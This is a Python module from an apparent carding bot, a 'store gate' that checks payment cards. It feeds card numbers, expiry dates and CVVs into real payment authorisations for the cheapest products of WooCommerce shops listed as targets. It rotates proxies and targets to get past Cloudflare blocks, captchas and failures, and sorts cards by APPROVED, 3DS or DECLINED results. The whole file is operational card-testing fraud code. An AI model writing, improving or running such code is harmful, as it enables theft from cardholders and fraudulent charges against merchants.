# language: Python 3.12+, file: bot/gates/storegate.py, target: Windows 11
# Sprint 4 gate #3: Woo Store API direct-confirm. Цели из env PUSTO_STORE_TARGETS
# или data/store_targets.txt (по строке на корень магазина). Платёжная авторизация
# на самый дешёвый товар (<= $2) — COST выше остальных.
import asyncio
import os
import random
from pathlib import Path

import gate_client as gc
from curl_cffi.requests import AsyncSession
from store_gate import check_target, MAX_PRICE_CENTS
import pusto_logger as log

NAME = "storegate"
COST = 2

_sem = asyncio.Semaphore(5)     # A6: сессия своя на каждый вызов — lock не нужен
_health: dict[str, dict] = {}   # A3: domain -> {lat_ms, fails} — in-memory скоринг

# Ценовые тиры /st [1|5|20] cc: верхняя граница и окно цены товара в центах.
# Фильтр — по cheapest_cents сайта из store_gates.json (min товар каталога).
PRICE_TIERS = {
    "1": (0, 100),        # < $1
    "5": (100, 500),      # $1-5
    "20": (500, 2001),    # $5-20
    "low": (0, 100), "mid": (100, 500), "high": (500, 2001),
}


def parse_tier(token: str) -> tuple[int, int] | None:
    """'/st 1 cc...' -> (0, 100); None — токен не тир."""
    return PRICE_TIERS.get(str(token).strip().lower())


def _cheapest_map() -> dict[str, int]:
    """domain -> cheapest_cents (мин. цена каталога) из store_gates.json."""
    import json
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_gates.json")
    try:
        with open(p, encoding="utf-8") as f:
            gates = json.load(f)
        return {g["domain"]: int(g["cheapest_cents"]) for g in gates
                if g.get("domain") and g.get("cheapest_cents") is not None}
    except Exception:
        return {}


def _dead_domains() -> set[str]:
    """Мёртвые по верификации: dead_surface/phantom из store_gates.json."""
    import json
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_gates.json")
    try:
        with open(p, encoding="utf-8") as f:
            gates = json.load(f)
        return {g.get("domain") for g in gates
                if g.get("dead_surface") or g.get("phantom")} - {None}
    except Exception:
        return set()


def _targets(tier: tuple[int, int] | None = None) -> list[str]:
    t = os.environ.get("PUSTO_STORE_TARGETS", "")
    if t:
        targets = [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    else:
        p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_targets.txt")
        if not os.path.exists(p):
            return []
        with open(p, encoding="utf-8") as f:
            targets = [ln.strip().rstrip("/") for ln in f if ln.strip().startswith("http")]
    dead = _dead_domains()
    if dead:
        targets = [t2 for t2 in targets
                   if t2.replace("https://", "") not in dead]
    if tier is not None:
        # ценовой тир: сайты с мин. товаром в окне [lo, hi)
        lo, hi = tier
        cmap = _cheapest_map()
        targets = [t2 for t2 in targets
                   if cmap.get(t2.replace("https://", "")) is not None
                   and lo <= cmap[t2.replace("https://", "")] < hi]
    return targets


_target_counter = 0


def _pick_target(targets: list[str]) -> str:
    """A3: взвешенный выбор по измеренной латентности (1/lat), без данных — round-robin.
    Быстрые цели получают приоритет; новые/неизмеренные распределяются по кругу."""
    global _target_counter
    import random as _r
    if not targets:
        raise RuntimeError("no store targets")
    known = [(t, _health[t]["lat_ms"]) for t in targets
             if t in _health and _health[t].get("lat_ms")]
    if not known:
        _target_counter += 1
        return targets[(_target_counter - 1) % len(targets)]
    # веса 1/latency; неизвестные цели получают медианный вес (исследуем их тоже)
    lats = sorted(l for _, l in known)
    med = lats[len(lats) // 2]
    weights = []
    for t in targets:
        lat = dict(known).get(t)
        fails = _health.get(t, {}).get("fails", 0)
        base_w = (1.0 / max(lat, 100)) if lat else (1.0 / max(med, 100))
        weights.append(base_w / (1.0 + fails * 10.0))
    return _r.choices(targets, weights=weights, k=1)[0]


def _normalize(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    cc = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc) <= 19) or not gc.check_luhn(cc):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not 1 <= month <= 12:
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(cc: str, mm: str, yy: str, cvv: str,
               tier: str | None = None) -> tuple[str, str]:
    """tier: '1' | '5' | '20' | low/mid/high — ценовое окно товара (см. PRICE_TIERS)."""
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")
    t_window = parse_tier(tier) if tier else None
    if tier and t_window is None:
        return ("ERROR", f"неизвестный ценовой тир '{tier}' (доступны: 1, 5, 20)")
    targets = _targets(tier=t_window)
    if not targets:
        targets = _targets(tier=None)
    if not targets:
        return ("ERROR", "нет доступных целей Store API в data/store_targets.txt")
    max_price = t_window[1] if (t_window and t_window[1] >= 500) else MAX_PRICE_CENTS
    async with _sem:  # A6: сессия своя на вызов — сериализация не нужна
        target = _pick_target(targets)  # A3: быстрые цели чаще
        proxy_pool = gc.load_proxies()
        proxy = gc.pick_proxy(proxy_pool, None)
        log.log_target("storegate", target, f"tier={tier or 'default'}, pool={len(targets)}")
        log.log_proxy("Using proxy for storegate", proxy)
        t0 = asyncio.get_event_loop().time()
        try:
            res = await check_target(target, raw, proxy, max_price)
            # Если через прокси получили ERROR (Cloudflare блок, no Nonce, 403) — штрафуем прокси и повторяем напрямую
            if proxy and res.get("status") == "ERROR":
                det = str(res.get("detail", "")).lower()
                if any(k in det for k in ("nonce", "403", "proxy", "curl:", "connection")):
                    log.log_proxy("Proxy failed during storegate, penalizing and retrying direct", proxy)
                    try:
                        from proxy_manager import ProxyPool
                        ProxyPool().mark_bad(proxy)
                    except Exception:
                        pass
                    res_direct = await check_target(target, raw, None, max_price)
                    if res_direct.get("status") != "ERROR" or res_direct.get("amount_cents", 0) > 0:
                        res = res_direct
                        proxy = None
            # Если и без прокси сорвалось на первой цели — пробуем вторую цель
            if res.get("status") == "ERROR" and res.get("amount_cents", 0) == 0:
                alt_targets = [t for t in targets if t != target]
                if alt_targets:
                    alt_target = _pick_target(alt_targets)
                    log.log_target("storegate:retry", alt_target, "First target failed, retrying on second target")
                    res_alt = await check_target(alt_target, raw, None, max_price)
                    if res_alt.get("status") != "ERROR" or res_alt.get("amount_cents", 0) > 0:
                        res = res_alt
                        target = alt_target
                        proxy = None
        except Exception as e:
            # Если сбой связан с прокси (connection closed, timeout, proxy error) — штрафуем прокси и повторяем
            err_str = str(e).lower()
            if proxy and ("proxy" in type(e).__name__.lower() or "curl: (97)" in err_str or "curl: (7)" in err_str or "curl: (28)" in err_str):
                log.log_proxy("Connection error with proxy, retrying with alternative proxy", proxy)
                try:
                    from proxy_manager import ProxyPool
                    pp = ProxyPool()
                    pp.mark_bad(proxy)
                except Exception:
                    pass
                try:
                    alt_proxy = gc.pick_proxy(proxy_pool, None)
                    if alt_proxy == proxy:
                        alt_proxy = None
                    res = await check_target(target, raw, alt_proxy, max_price)
                    proxy = alt_proxy
                except Exception as inner_e:
                    h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
                    h["fails"] += 1
                    log.log_error("storegate", f"Inner retry failed: {inner_e}", exc=inner_e)
                    return ("ERROR", f"{type(inner_e).__name__}: {inner_e}"[:180])
            else:
                h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
                h["fails"] += 1
                log.log_error("storegate", f"Check target failed: {e}", exc=e)
                return ("ERROR", f"{type(e).__name__}: {e}"[:180])

        lat = int((asyncio.get_event_loop().time() - t0) * 1000)
        log.log_gate("storegate", f"Done on {target}: {res.get('status')} | {res.get('detail')} ({lat}ms)")

        # Если check_target вернул ERROR из-за прокси — штрафуем узел и повторяем с резервным
        det = str(res.get("detail", "")).lower()
        if proxy and res.get("status") == "ERROR" and any(k in det for k in ("proxy", "curl: (97)", "curl: (7)", "curl: (28)", "connection closed")):
            try:
                from proxy_manager import ProxyPool
                pp = ProxyPool()
                pp.mark_bad(proxy)
            except Exception:
                pass
            try:
                alt_proxy = gc.pick_proxy(proxy_pool, None)
                if alt_proxy == proxy:
                    alt_proxy = None
                res = await check_target(target, raw, alt_proxy, max_price)
                proxy = alt_proxy
            except Exception:
                pass

        h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
        h["lat_ms"] = lat  # измеренная латентность кормит _pick_target
        st = res.get("status", "ERROR")
        if st in ("APPROVED@PAID", "3DS_FRICTIONLESS", "3DS_CHALLENGE", "DECLINED"):
            h["fails"] = 0
        elif "CAPTCHA" in st or "CAPTCHA" in str(res.get("detail", "")).upper() or st == "ERROR":
            h["fails"] += 1
        return (res.get("status", "ERROR"),
                f"[{res.get('amount_cents', 0)}c {res.get('currency', '')}] "
                f"{str(res.get('detail', ''))[:160]}",
                {"proxy": proxy, "target": target})
